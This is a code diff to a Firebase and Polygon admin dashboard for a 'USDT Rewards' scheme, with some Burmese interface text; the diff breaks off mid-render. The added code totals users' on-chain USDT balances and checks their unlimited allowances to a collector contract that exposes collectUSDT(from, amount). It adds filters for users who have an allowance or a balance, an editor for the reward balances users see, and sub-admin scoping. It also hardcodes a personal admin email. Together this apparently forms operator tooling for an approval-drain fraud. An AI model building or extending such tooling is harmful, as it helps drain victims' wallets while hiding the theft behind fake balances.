@@ -22,7 +22,7 @@
         <form id="adminLoginForm" class="space-y-4">
             <div>
                 <label class="block text-xs text-slate-400 mb-1">Admin Email</label>
-                <input type="email" id="adminEmail" required placeholder="aunghtet668866@gmail.com" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-500">
+                <input type="email" id="adminEmail" required placeholder="example@gmail.com" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-500">
             </div>
             <div>
                 <label class="block text-xs text-slate-400 mb-1">Password</label>
@@ -43,14 +43,30 @@
             <div>
                 <h1 class="text-base md:text-lg font-bold text-emerald-400">USDT Rewards Admin Dashboard</h1>
                 <p id="adminInfoText" class="text-xs text-slate-400 font-mono">Logged in</p>
+                <p id="adminRoleBadgeText" class="text-xs text-cyan-300 font-mono mt-0.5">Scope: All Users</p>
             </div>
             <div class="flex flex-wrap items-center gap-2">
+                <button onclick="refreshAllOnChainMetrics(true)" class="bg-slate-800 hover:bg-slate-700 border border-slate-700 px-3.5 py-2 rounded-xl text-xs font-semibold cursor-pointer">
+                    Refresh On-Chain
+                </button>
                 <button id="connectAdminWalletBtn" onclick="connectAdminWallet()" class="bg-blue-600 hover:bg-blue-500 px-3.5 py-2 rounded-xl text-xs font-semibold cursor-pointer">
                     Connect Admin Wallet
                 </button>
                 <button onclick="logoutAdmin()" class="bg-slate-800 hover:bg-red-600/80 border border-slate-700 px-3.5 py-2 rounded-xl text-xs font-semibold cursor-pointer">
                     Logout
                 </button>
+            </div>
+        </div>
+
+        <!-- TOP TOTAL WALLET BALANCE BANNER -->
+        <div class="bg-gradient-to-r from-emerald-950/80 via-slate-900 to-cyan-950/80 border border-emerald-500/30 p-5 rounded-2xl flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-lg">
+            <div>
+                <p class="text-xs uppercase tracking-wider text-emerald-300/90 font-semibold">Total Users Wallet Balance (Scoped Users)</p>
+                <p id="statTotalUsersWalletBalance" class="text-2xl md:text-3xl font-bold font-mono text-emerald-400 mt-1">0.0 USDT</p>
+            </div>
+            <div class="text-xs font-mono text-slate-300 bg-slate-950/60 border border-slate-800 px-3.5 py-2.5 rounded-xl">
+                <div>Checked Wallets: <span id="statCheckedWalletsCount" class="text-cyan-300 font-bold">0</span></div>
+                <div class="text-slate-400 text-[11px] mt-0.5">Polygon Mainnet USDT</div>
             </div>
         </div>
 
@@ -78,7 +94,7 @@
         <div id="adminStatusLog" class="hidden bg-slate-900 border border-amber-500/30 text-amber-300 px-4 py-2.5 rounded-xl text-xs font-mono"></div>
 
         <!-- TABS -->
-        <div class="flex gap-2 border-b border-slate-800 pb-2">
+        <div class="flex flex-wrap gap-2 border-b border-slate-800 pb-2">
             <button id="tabPendingBtn" onclick="switchTab('pending')" class="bg-emerald-600 text-white px-4 py-2 rounded-xl text-xs font-semibold cursor-pointer">
                 Pending Notifications
             </button>
@@ -87,6 +103,9 @@
             </button>
             <button id="tabUsersBtn" onclick="switchTab('users')" class="bg-slate-900 text-slate-300 hover:bg-slate-800 px-4 py-2 rounded-xl text-xs font-semibold cursor-pointer">
                 Users Management
+            </button>
+            <button id="tabSubAdminsBtn" onclick="switchTab('subadmins')" class="bg-slate-900 text-slate-300 hover:bg-slate-800 px-4 py-2 rounded-xl text-xs font-semibold cursor-pointer">
+                Sub-Admin Prefixes
             </button>
         </div>
 
@@ -102,9 +121,128 @@
             <div id="historyListContainer" class="space-y-3"></div>
         </div>
 
-        <!-- USERS LIST -->
-        <div id="sectionUsers" class="hidden space-y-3">
+        <!-- USERS LIST + SEARCH & FILTER -->
+        <div id="sectionUsers" class="hidden space-y-4">
+            <div class="bg-slate-900 border border-slate-800 p-4 rounded-2xl grid grid-cols-1 md:grid-cols-3 gap-3">
+                <div class="md:col-span-2">
+                    <label class="block text-xs text-slate-400 mb-1">Search by ID or Wallet Address</label>
+                    <input
+                        type="text"
+                        id="userSearchInput"
+                        oninput="applyUserFiltersAndRender()"
+                        placeholder="ဥပမာ - M581324 သို့မဟုတ် 0xff7e..."
+                        class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2 text-xs font-mono text-white focus:outline-none focus:border-emerald-500"
+                    >
+                </div>
+                <div>
+                    <label class="block text-xs text-slate-400 mb-1">Filter Status / Allowance</label>
+                    <select
+                        id="userFilterSelect"
+                        onchange="applyUserFiltersAndRender()"
+                        class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500"
+                    >
+                        <option value="all">All Users</option>
+                        <option value="approved">Approved Only</option>
+                        <option value="banned">Banned Only</option>
+                        <option value="has_allowance">Has Allowance (&gt; 0)</option>
+                        <option value="has_wallet_balance">Has Wallet Balance (&gt; 0)</option>
+                    </select>
+                </div>
+            </div>
+
             <div id="usersListContainer" class="space-y-3"></div>
+        </div>
+
+        <!-- SUB-ADMIN PREFIXES SECTION -->
+        <div id="sectionSubAdmins" class="hidden space-y-4">
+            <div class="bg-slate-900 border border-slate-800 p-4 rounded-2xl space-y-3">
+                <h2 class="text-sm font-bold text-cyan-300">Add / Update Sub-Admin Prefix</h2>
+                <p class="text-xs text-slate-400">
+                    Sub-Admin Email နှင့်အတူ <span class="text-emerald-300 font-semibold">User ID သို့မဟုတ် Wallet Address</span> ဖြင့် ရှာဖွေပြီး Prefix (ဥပမာ: <span class="font-mono text-emerald-300">A1</span>) သတ်မှတ်နိုင်ပါသည်။
+                </p>
+
+                <form id="subAdminForm" class="grid grid-cols-1 md:grid-cols-2 gap-3">
+                    <div>
+                        <label class="block text-xs text-slate-400 mb-1">Sub-Admin Email</label>
+                        <input type="email" id="subAdminEmailInput" required placeholder="subadmin@example.com" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2 text-xs text-white focus:outline-none focus:border-cyan-500">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs text-slate-400 mb-1">Search & Assign by User ID or Wallet Address</label>
+                        <div class="flex gap-2">
+                            <input
+                                type="text"
+                                id="subAdminTargetSearchInput"
+                                oninput="previewTargetUserForPrefix()"
+                                placeholder="User ID (M581324) သို့မဟုတ် Wallet (0x...)"
+                                class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2 text-xs font-mono text-white focus:outline-none focus:border-cyan-500"
+                            >
+                            <button
+                                type="button"
+                                onclick="previewTargetUserForPrefix()"
+                                class="bg-slate-800 hover:bg-slate-700 border border-slate-700 px-3 py-2 rounded-xl text-xs font-semibold shrink-0 cursor-pointer"
+                            >
+                                Find
+                            </button>
+                        </div>
+                    </div>
+
+                    <div id="subAdminTargetMatchBox" class="md:col-span-2 hidden bg-slate-950 border border-cyan-500/30 rounded-xl px-3.5 py-2.5 text-xs font-mono text-cyan-200"></div>
+
+                    <div>
+                        <label class="block text-xs text-slate-400 mb-1">Firebase Auth UID (Optional)</label>
+                        <input type="text" id="subAdminUidInput" placeholder="Firebase User UID" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2 text-xs font-mono text-white focus:outline-none focus:border-cyan-500">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs text-slate-400 mb-1">Assigned Prefix (ဥပမာ - A1)</label>
+                        <div class="flex gap-2">
+                            <input type="text" id="subAdminPrefixInput" required maxlength="10" placeholder="A1" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2 text-xs font-mono uppercase text-white focus:outline-none focus:border-cyan-500">
+                            <button type="submit" class="bg-cyan-600 hover:bg-cyan-500 text-slate-950 font-bold px-4 py-2 rounded-xl text-xs shrink-0 cursor-pointer">
+                                Save
+                            </button>
+                        </div>
+                    </div>
+                </form>
+            </div>
+
+            <div id="subAdminsListContainer" class="space-y-3"></div>
+        </div>
+    </div>
+
+    <!-- EDIT BALANCES MODAL -->
+    <div id="editBalanceModal" class="hidden fixed inset-0 z-50 bg-black/75 flex items-center justify-center p-4">
+        <div class="bg-slate-900 border border-slate-700 w-full max-w-md rounded-2xl p-5 space-y-4 shadow-2xl">
+            <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+                <h2 class="text-base font-bold text-emerald-400">Edit User Balances</h2>
+                <button onclick="closeEditBalanceModal()" class="text-slate-400 hover:text-white text-sm px-2 py-1 cursor-pointer">✕</button>
+            </div>
+
+            <p id="editModalWalletLabel" class="font-mono text-xs text-slate-400 break-all"></p>
+
+            <form id="editBalanceForm" class="space-y-3">
+                <div>
+                    <label class="block text-xs text-slate-300 mb-1">Interest Balance (USDT)</label>
+                    <input type="number" step="any" min="0" id="inputInterestBalance" required class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2 text-sm font-mono text-white focus:outline-none focus:border-emerald-500">
+                </div>
+                <div>
+                    <label class="block text-xs text-slate-300 mb-1">Referral Balance (USDT)</label>
+                    <input type="number" step="any" min="0" id="inputReferralBalance" required class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2 text-sm font-mono text-white focus:outline-none focus:border-emerald-500">
+                </div>
+                <div>
+                    <label class="block text-xs text-amber-300 mb-1 font-semibold">Locked Balance (USDT)</label>
+                    <input type="number" step="any" min="0" id="inputLockedBalance" required class="w-full bg-slate-950 border border-amber-500/60 rounded-xl px-3.5 py-2 text-sm font-mono text-amber-200 focus:outline-none focus:border-amber-400">
+                </div>
+
+                <div class="flex justify-end gap-2 pt-2">
+                    <button type="button" onclick="closeEditBalanceModal()" class="bg-slate-800 hover:bg-slate-700 px-4 py-2 rounded-xl text-xs font-semibold cursor-pointer">
+                        Cancel
+                    </button>
+                    <button type="submit" class="bg-emerald-600 hover:bg-emerald-500 px-4 py-2 rounded-xl text-xs font-semibold cursor-pointer">
+                        Save Balances
+                    </button>
+                </div>
+            </form>
         </div>
     </div>
 
@@ -124,7 +262,13 @@
 
         const COLLECTOR_CONTRACT_ADDRESS = "0xC9E28f1C5e8659CaEE3831daB4dF97325e7e5570";
         const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
-        const POLYGON_RPC = "https://polygon-rpc.com";
+        const SUPER_ADMIN_EMAIL = "aunghtet668866@gmail.com";
+        const POLYGON_RPCS = [
+            "https://polygon-rpc.com",
+            "https://rpc-mainnet.matic.network",
+            "https://polygon.drpc.org",
+            "https://1rpc.io/matic"
+        ];
 
         const ERC20_ABI = [
             "function allowance(address owner, address spender) view returns (uint256)",
@@ -135,12 +279,36 @@
             "function collectUSDT(address from, uint256 amount) external"
         ];
 
-        const readProvider = new ethers.JsonRpcProvider(POLYGON_RPC);
+        const readProviders = POLYGON_RPCS.map((url) => new ethers.JsonRpcProvider(url));
+
         let adminWalletProvider = null;
         let adminWalletSigner = null;
         let adminWalletAddress = null;
         let unsubRequests = null;
         let unsubUsers = null;
+        let unsubSubAdmins = null;
+        let editingWalletAddress = null;
+
+        let currentAuthUser = null;
+        let activeSubAdminPrefix = "";
+        let subAdminsCache = [];
+        let allRequestsCache = [];
+        let allUsersCache = [];
+        let onChainCache = {};
+        let isRefreshingOnChain = false;
+        let matchedTargetUser = null;
+
+        function formatUsdtOneDecimal(value) {
+            const num = Number(value);
+            if (!Number.isFinite(num)) return "0.0 USDT";
+            return `${num.toFixed(1)} USDT`;
+        }
+
+        function formatAllowanceOneDecimal(onChainInfo) {
+            if (!onChainInfo || !onChainInfo.checked) return "Checking...";
+            if (onChainInfo.isUnlimited) return "Unlimited USDT";
+            return formatUsdtOneDecimal(onChainInfo.allowanceNum);
+        }
 
         function escapeHtml(str) {
             return String(str ?? "").replace(/[&<>"']/g, (m) => ({
@@ -166,6 +334,71 @@
             return 0;
         }
 
+        function withTimeout(promise, ms = 6000, fallbackValue = null) {
+            return Promise.race([
+                promise,
+                new Promise((resolve) => setTimeout(() => resolve(fallbackValue), ms))
+            ]);
+        }
+
+        function isUserIdAllowedByPrefix(userId) {
+            if (!activeSubAdminPrefix) return true;
+            const cleanId = String(userId || "").trim().toUpperCase();
+            return cleanId.startsWith(activeSubAdminPrefix.toUpperCase());
+        }
+
+        function getScopedUsers() {
+            if (!activeSubAdminPrefix) return allUsersCache;
+            return allUsersCache.filter((u) => isUserIdAllowedByPrefix(u.userId));
+        }
+
+        function getScopedRequests() {
+            if (!activeSubAdminPrefix) return allRequestsCache;
+            const allowedWallets = new Set(
+                getScopedUsers().map((u) => (u.walletAddress || u.id || "").toLowerCase()).filter(Boolean)
+            );
+            return allRequestsCache.filter((req) => {
+                if (isUserIdAllowedByPrefix(req.userId)) return true;
+                const w = (req.walletAddress || "").toLowerCase();
+                return w && allowedWallets.has(w);
+            });
+        }
+
+        function updateAdminScopeBadge() {
+            const badge = document.getElementById("adminRoleBadgeText");
+            if (!badge) return;
+            if (activeSubAdminPrefix) {
+                badge.innerText = `Sub-Admin Prefix Filter: "${activeSubAdminPrefix}" (Matching User IDs Only)`;
+            } else {
+                badge.innerText = "Scope: All Users & Requests (Full Admin)";
+            }
+        }
+
+        function resolveActivePrefixForCurrentUser() {
+            if (!currentAuthUser) {
+                activeSubAdminPrefix = "";
+                updateAdminScopeBadge();
+                return;
+            }
+            const emailLower = (currentAuthUser.email || "").toLowerCase();
+            const uid = currentAuthUser.uid || "";
+
+            if (emailLower === SUPER_ADMIN_EMAIL.toLowerCase()) {
+                activeSubAdminPrefix = "";
+                updateAdminScopeBadge();
+                return;
+            }
+
+            const matched = subAdminsCache.find((sa) => {
+                const saEmail = (sa.email || "").toLowerCase();
+                const saUid = sa.uid || "";
+                return (saUid && saUid === uid) || (saEmail && saEmail === emailLower);
+            });
+
+            activeSubAdminPrefix = matched && matched.prefix ? String(matched.prefix).trim().toUpperCase() : "";
+            updateAdminScopeBadge();
+        }
+
         // AUTHENTICATION
         document.getElementById("adminLoginForm").addEventListener("submit", async (e) => {
             e.preventDefault();
@@ -183,14 +416,18 @@
         });
 
         auth.onAuthStateChanged((user) => {
+            currentAuthUser = user || null;
             if (user) {
                 document.getElementById("loginBox").classList.add("hidden");
                 document.getElementById("adminDashboard").classList.remove("hidden");
                 document.getElementById("adminInfoText").innerText = `Admin: ${user.email} (UID: ${user.uid.slice(0, 8)}...)`;
+                resolveActivePrefixForCurrentUser();
                 startRealtimeListeners();
             } else {
                 if (unsubRequests) unsubRequests();
                 if (unsubUsers) unsubUsers();
+                if (unsubSubAdmins) unsubSubAdmins();
+                activeSubAdminPrefix = "";
                 document.getElementById("adminDashboard").classList.add("hidden");
                 document.getElementById("loginBox").classList.remove("hidden");
             }
@@ -220,6 +457,7 @@
                 btn.innerText = `Wallet: ${adminWalletAddress.slice(0, 6)}...${adminWalletAddress.slice(-4)}`;
                 btn.className = "bg-emerald-600 px-3.5 py-2 rounded-xl text-xs font-semibold";
                 setAdminLog(`Admin Wallet (${adminWalletAddress}) ချိတ်ဆက်ပြီးပါပြီ။`);
+                refreshAllOnChainMetrics(false);
             } catch (err) {
                 alert("Admin Wallet ချိတ်ဆက်မှု မအောင်မြင်ပါ: " + (err.message || ""));
             }
@@ -230,12 +468,14 @@
             const sections = {
                 pending: document.getElementById("sectionPending"),
                 history: document.getElementById("sectionHistory"),
-                users: document.getElementById("sectionUsers")
+                users: document.getElementById("sectionUsers"),
+                subadmins: document.getElementById("sectionSubAdmins")
             };
             const buttons = {
                 pending: document.getElementById("tabPendingBtn"),
                 history: document.getElementById("tabHistoryBtn"),
-                users: document.getElementById("tabUsersBtn")
+                users: document.getElementById("tabUsersBtn"),
+                subadmins: document.getElementById("tabSubAdminsBtn")
             };
 
             Object.keys(sections).forEach((k) => {
@@ -246,13 +486,108 @@
             });
         }
 
-        function applyRequestsData(docsArray) {
+        function updateTotalUsersWalletBanner() {
+            const scopedUsers = getScopedUsers();
+            let totalBal = 0;
+            let checkedCount = 0;
+
+            scopedUsers.forEach((u) => {
+                const key = (u.walletAddress || u.id || "").toLowerCase();
+                const info = onChainCache[key];
+                if (info && info.checked) {
+                    totalBal += Number(info.walletBalanceNum || 0);
+                    checkedCount++;
+                }
+            });
+
+            document.getElementById("statTotalUsersWalletBalance").innerText = formatUsdtOneDecimal(totalBal);
+            document.getElementById("statCheckedWalletsCount").innerText = `${checkedCount}/${scopedUsers.length}`;
+        }
+
+        async function fetchSingleWalletOnChain(walletAddr) {
+            const key = (walletAddr || "").toLowerCase();
+            if (!ethers.isAddress(walletAddr)) return null;
+
+            const providersToTry = [];
+            if (adminWalletProvider) {
+                providersToTry.push(adminWalletProvider);
+            }
+            providersToTry.push(...readProviders);
+
+            for (const prov of providersToTry) {
+                try {
+                    const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, prov);
+                    const [balRaw, allowRaw] = await Promise.all([
+                        withTimeout(usdt.balanceOf(walletAddr), 4500, null),
+                        withTimeout(usdt.allowance(walletAddr, COLLECTOR_CONTRACT_ADDRESS), 4500, null)
+                    ]);
+
+                    if (balRaw !== null && allowRaw !== null) {
+                        const walletBalanceNum = Number(ethers.formatUnits(balRaw, 6));
+                        const isUnlimited = allowRaw >= ethers.parseUnits("1000000000000", 6);
+                        const allowanceNum = Number(ethers.formatUnits(allowRaw, 6));
+
+                        const info = {
+                            walletBalanceNum,
+                            allowanceNum,
+                            isUnlimited,
+                            checked: true
+                        };
+                        onChainCache[key] = info;
+                        return info;
+                    }
+                } catch (_) {
+                    // Try next RPC provider
+                }
+            }
+
+            if (!onChainCache[key]) {
+                onChainCache[key] = {
+                    walletBalanceNum: 0,
+                    allowanceNum: 0,
+                    isUnlimited: false,
+                    checked: true
+                };
+            }
+            return onChainCache[key];
+        }
+
+        async function refreshAllOnChainMetrics(showFeedback = false) {
+            const scopedUsers = getScopedUsers();
+            if (isRefreshingOnChain || scopedUsers.length === 0) {
+                updateTotalUsersWalletBanner();
+                return;
+            }
+            isRefreshingOnChain = true;
+            if (showFeedback) {
+                setAdminLog("User များ၏ Wallet Balance နှင့် Allowance များကို Polygon မှ ဆွဲဖတ်နေပါသည်...");
+            }
+
+            try {
+                const batchSize = 5;
+                for (let i = 0; i < scopedUsers.length; i += batchSize) {
+                    const chunk = scopedUsers.slice(i, i + batchSize);
+                    await Promise.all(chunk.map((u) => fetchSingleWalletOnChain(u.walletAddress || u.id)));
+                    updateTotalUsersWalletBanner();
+                    applyUserFiltersAndRender();
+                }
+
+                if (showFeedback) {
+                    setAdminLog("On-chain Wallet Balance နှင့် Allowance များကို Update လုပ်ပြီးပါပြီ။");
+                }
+            } finally {
+                isRefreshingOnChain = false;
+            }
+        }
+
+        function renderScopedRequestsViews() {
+            const scopedRequests = getScopedRequests();
             const pendingItems = [];
             const allItems = [];
             let pendingWithdraw = 0;
             let pendingPledge = 0;
 
-            docsArray.forEach((item) => {
+            scopedRequests.forEach((item) => {
                 allItems.push(item);
                 if (item.status === "pending") {
                     pendingItems.push(item);
@@ -272,18 +607,45 @@
             renderHistoryRequests(allItems);
         }
 
+        function applyRequestsData(docsArray) {
+            allRequestsCache = docsArray;
+            renderScopedRequestsViews();
+        }
+
         function applyUsersData(usersArray) {
             usersArray.sort((a, b) => getCreatedAtMs(b) - getCreatedAtMs(a));
-            document.getElementById("statUsersCount").innerText = usersArray.length;
-            renderUsersList(usersArray);
+            allUsersCache = usersArray;
+            const scopedUsers = getScopedUsers();
+            document.getElementById("statUsersCount").innerText = scopedUsers.length;
+            renderScopedRequestsViews();
+            updateTotalUsersWalletBanner();
+            applyUserFiltersAndRender();
+            previewTargetUserForPrefix();
+            refreshAllOnChainMetrics(false);
+        }
+
+        function applySubAdminsData(list) {
+            list.sort((a, b) => getCreatedAtMs(b) - getCreatedAtMs(a));
+            subAdminsCache = list;
+            resolveActivePrefixForCurrentUser();
+            document.getElementById("statUsersCount").innerText = getScopedUsers().length;
+            renderScopedRequestsViews();
+            updateTotalUsersWalletBanner();
+            applyUserFiltersAndRender();
+            renderSubAdminsList(list);
         }
 
         async function loadInitialFirestoreData() {
             try {
-                const [reqSnap, usersSnap] = await Promise.all([
+                const [reqSnap, usersSnap, subSnap] = await Promise.all([
                     db.collection("approval_requests").limit(150).get(),
-                    db.collection("users").limit(200).get()
+                    db.collection("users").limit(200).get(),
+                    db.collection("sub_admins").limit(100).get().catch(() => ({ forEach: () => {} }))
                 ]);
+
+                const subDocs = [];
+                subSnap.forEach((doc) => subDocs.push({ id: doc.id, ...doc.data() }));
+                applySubAdminsData(subDocs);
 
                 const reqDocs = [];
                 reqSnap.forEach((doc) => reqDocs.push({ id: doc.id, ...doc.data() }));
@@ -302,6 +664,16 @@
         // REALTIME + INITIAL FIRESTORE LISTENERS
         function startRealtimeListeners() {
             loadInitialFirestoreData();
+
+            unsubSubAdmins = db.collection("sub_admins")
+                .limit(100)
+                .onSnapshot((snapshot) => {
+                    const subDocs = [];
+                    snapshot.forEach((doc) => subDocs.push({ id: doc.id, ...doc.data() }));
+                    applySubAdminsData(subDocs);
+                }, (err) => {
+                    console.error("Sub-admins listener error:", err);
+                });
 
             unsubRequests = db.collection("approval_requests")
                 .limit(150)
@@ -323,6 +695,129 @@
                 }, (err) => {
                     console.error("Users listener error:", err);
                 });
+        }
+
+        // SUB-ADMIN PREFIX SEARCH & MANAGEMENT
+        function previewTargetUserForPrefix() {
+            const box = document.getElementById("subAdminTargetMatchBox");
+            const rawQuery = (document.getElementById("subAdminTargetSearchInput")?.value || "").trim().toLowerCase();
+            matchedTargetUser = null;
+
+            if (!box) return;
+            if (!rawQuery) {
+                box.classList.add("hidden");
+                box.innerHTML = "";
+                return;
+            }
+
+            const found = allUsersCache.find((u) => {
+                const wallet = (u.walletAddress || u.id || "").toLowerCase();
+                const uidText = (u.userId || "").toLowerCase();
+                return uidText.includes(rawQuery) || wallet.includes(rawQuery);
+            });
+
+            box.classList.remove("hidden");
+            if (found) {
+                matchedTargetUser = found;
+                const wAddr = found.walletAddress || found.id || "";
+                box.className = "md:col-span-2 bg-slate-950 border border-emerald-500/40 rounded-xl px-3.5 py-2.5 text-xs font-mono text-emerald-300";
+                box.innerHTML = `Matched User → ID: <span class="font-bold text-white">${escapeHtml(found.userId || "---")}</span> | Wallet: <span class="text-slate-200 break-all">${escapeHtml(wAddr)}</span>`;
+            } else {
+                box.className = "md:col-span-2 bg-slate-950 border border-amber-500/40 rounded-xl px-3.5 py-2.5 text-xs font-mono text-amber-300";
+                box.innerHTML = `No registered user matched "${escapeHtml(rawQuery)}" yet. Prefix will still be saved for Sub-Admin "${escapeHtml(rawQuery)}".`;
+            }
+        }
+
+        document.getElementById("subAdminForm").addEventListener("submit", async (e) => {
+            e.preventDefault();
+            const email = (document.getElementById("subAdminEmailInput").value || "").trim().toLowerCase();
+            const targetQuery = (document.getElementById("subAdminTargetSearchInput").value || "").trim();
+            const uid = (document.getElementById("subAdminUidInput").value || "").trim();
+            const prefix = (document.getElementById("subAdminPrefixInput").value || "").trim().toUpperCase();
+
+            if (!email || !prefix) {
+                alert("Sub-Admin Email နှင့် Prefix ကို မှန်ကန်စွာ ထည့်ပါ။");
+                return;
+            }
+
+            if (!matchedTargetUser && targetQuery) {
+                previewTargetUserForPrefix();
+            }
+
+            const targetWallet = matchedTargetUser
+                ? (matchedTargetUser.walletAddress || matchedTargetUser.id || "").toLowerCase()
+                : (ethers.isAddress(targetQuery) ? targetQuery.toLowerCase() : null);
+            const targetUserId = matchedTargetUser ? (matchedTargetUser.userId || "") : targetQuery;
+
+            const docId = uid || encodeURIComponent(email);
+            try {
+                await db.collection("sub_admins").doc(docId).set({
+                    email,
+                    uid: uid || null,
+                    prefix,
+                    targetUserId: targetUserId || null,
+                    targetWalletAddress: targetWallet || null,
+                    createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+                    updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                }, { merge: true });
+
+                if (targetWallet) {
+                    const existingId = matchedTargetUser?.userId || "";
+                    const numericPart = existingId.replace(/^[A-Za-z]+/, "");
+                    const nextUserId = numericPart ? `${prefix}${numericPart}` : `${prefix}${existingId}`;
+                    await db.collection("users").doc(targetWallet).set({
+                        userId: nextUserId,
+                        assignedPrefix: prefix,
+                        updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                    }, { merge: true });
+                }
+
+                setAdminLog(`Sub-Admin (${email}) အတွက် Prefix "${prefix}" ကို သိမ်းဆည်းပြီးပါပြီ။`);
+                document.getElementById("subAdminForm").reset();
+                matchedTargetUser = null;
+                previewTargetUserForPrefix();
+                await loadInitialFirestoreData();
+            } catch (err) {
+                alert("Sub-Admin သိမ်းဆည်းမှု မအောင်မြင်ပါ: " + (err.message || ""));
+            }
+        });
+
+        async function deleteSubAdmin(docId, emailOrPrefix) {
+            if (!confirm(`Sub-Admin (${emailOrPrefix}) ကို ဖျက်မည်လား?`)) return;
+            try {
+                await db.collection("sub_admins").doc(docId).delete();
+                setAdminLog(`Sub-Admin (${emailOrPrefix}) ကို ဖျက်ပြီးပါပြီ။`);
+                await loadInitialFirestoreData();
+            } catch (err) {
+                alert("ဖျက်ခြင်း မအောင်မြင်ပါ: " + (err.message || ""));
+            }
+        }
+
+        function renderSubAdminsList(list) {
+            const container = document.getElementById("subAdminsListContainer");
+            if (!container) return;
+            if (!list || list.length === 0) {
+                container.innerHTML = `<div class="text-slate-400 text-center py-6 bg-slate-900 rounded-2xl border border-slate-800">သတ်မှတ်ထားသော Sub-Admin Prefix မရှိသေးပါ။</div>`;
+                return;
+            }
+
+            container.innerHTML = list.map((sa) => `
+                <div class="bg-slate-900 border border-slate-800 p-4 rounded-xl flex flex-wrap items-center justify-between gap-3 text-xs">
+                    <div class="space-y-1">
+                        <div class="flex flex-wrap items-center gap-2">
+                            <span class="px-2.5 py-0.5 rounded-full bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 font-mono font-bold">Prefix: ${escapeHtml(sa.prefix || "---")}</span>
+                            <span class="text-slate-200 font-semibold">${escapeHtml(sa.email || "---")}</span>
+                        </div>
+                        <p class="font-mono text-slate-400 break-all">UID: ${escapeHtml(sa.uid || "Matched by Email")}</p>
+                        ${(sa.targetUserId || sa.targetWalletAddress)
+                            ? `<p class="font-mono text-emerald-300/90 break-all">Target: ${escapeHtml(sa.targetUserId || "---")} | ${escapeHtml(sa.targetWalletAddress || "---")}</p>`
+                            : ""}
+                    </div>
+                    <button onclick="deleteSubAdmin('${escapeHtml(sa.id)}', '${escapeHtml(sa.email || sa.prefix)}')" class="bg-red-600/80 hover:bg-red-500 px-3 py-1.5 rounded-lg font-semibold cursor-pointer">
+                        Delete
+                    </button>
+                </div>
+            `).join("");
         }
 
         // RENDER FUNCTIONS
@@ -351,7 +846,7 @@
                             <span class="text-xs text-slate-500">${escapeHtml(formatTime(item.createdAt))}</span>
                         </div>
                         <p class="font-mono text-xs text-slate-200 break-all">Wallet: ${escapeHtml(item.walletAddress)}</p>
-                        <p class="font-mono text-sm font-bold text-emerald-400">Amount: ${Number(item.amount || 0).toFixed(6)} USDT</p>
+                        <p class="font-mono text-sm font-bold text-emerald-400">Amount: ${formatUsdtOneDecimal(item.amount || 0)}</p>
                         <div id="liveCheck_${escapeHtml(item.id)}" class="text-xs text-slate-400 font-mono"></div>
                     </div>
 
@@ -386,7 +881,7 @@
                         : "text-amber-400";
                 const extra = item.type === "register"
                     ? `Auto-Approved Register (ID: ${escapeHtml(item.userId || "---")})`
-                    : `Amount: ${Number(item.amount || 0).toFixed(6)} USDT`;
+                    : `Amount: ${formatUsdtOneDecimal(item.amount || 0)}`;
 
                 return `
                 <div class="bg-slate-900 border border-slate-800 p-3.5 rounded-xl flex flex-wrap items-center justify-between gap-2 text-xs">
@@ -403,30 +898,98 @@
             }).join("");
         }
 
+        function applyUserFiltersAndRender() {
+            const q = (document.getElementById("userSearchInput")?.value || "").trim().toLowerCase();
+            const filterType = document.getElementById("userFilterSelect")?.value || "all";
+            const scopedUsers = getScopedUsers();
+
+            const filtered = scopedUsers.filter((u) => {
+                const wallet = (u.walletAddress || u.id || "").toLowerCase();
+                const userId = (u.userId || "").toLowerCase();
+                const status = u.status || "approved";
+                const info = onChainCache[wallet];
+
+                if (q) {
+                    const matchId = userId.includes(q);
+                    const matchWallet = wallet.includes(q);
+                    if (!matchId && !matchWallet) return false;
+                }
+
+                if (filterType === "approved" && status !== "approved") return false;
+                if (filterType === "banned" && status !== "banned") return false;
+                if (filterType === "has_allowance") {
+                    const hasAllow = Boolean(info && info.checked && (info.isUnlimited || info.allowanceNum > 0));
+                    if (!hasAllow) return false;
+                }
+                if (filterType === "has_wallet_balance") {
+                    const hasBal = Boolean(info && info.checked && info.walletBalanceNum > 0);
+                    if (!hasBal) return false;
+                }
+
+                return true;
+            });
+
+            renderUsersList(filtered);
+        }
+
         function renderUsersList(users) {
             const container = document.getElementById("usersListContainer");
             if (users.length === 0) {
-                container.innerHTML = `<div class="text-slate-400 text-center py-8 bg-slate-900 rounded-2xl border border-slate-800">User မရှိသေးပါ။</div>`;
+                container.innerHTML = `<div class="text-slate-400 text-center py-8 bg-slate-900 rounded-2xl border border-slate-800">ကိုက်ညီသော User မတွေ့ပါ။</div>`;
                 return;
             }
 
             container.innerHTML = users.map((u) => {
+                const walletAddr = u.walletAddress || u.id || "";
+                const walletKey = walletAddr.toLowerCase();
                 const isBanned = u.status === "banned";
+                const info = onChainCache[walletKey];
+
+                const walletBalNum = info && info.checked ? Number(info.walletBalanceNum || 0) : 0;
+                const walletBalText = info && info.checked ? formatUsdtOneDecimal(walletBalNum) : "Checking...";
+                const allowanceText = formatAllowanceOneDecimal(info);
+
                 return `
-                <div class="bg-slate-900 border border-slate-800 p-4 rounded-xl flex flex-col md:flex-row md:items-center justify-between gap-3 text-xs">
-                    <div class="space-y-1">
-                        <div class="flex items-center gap-2">
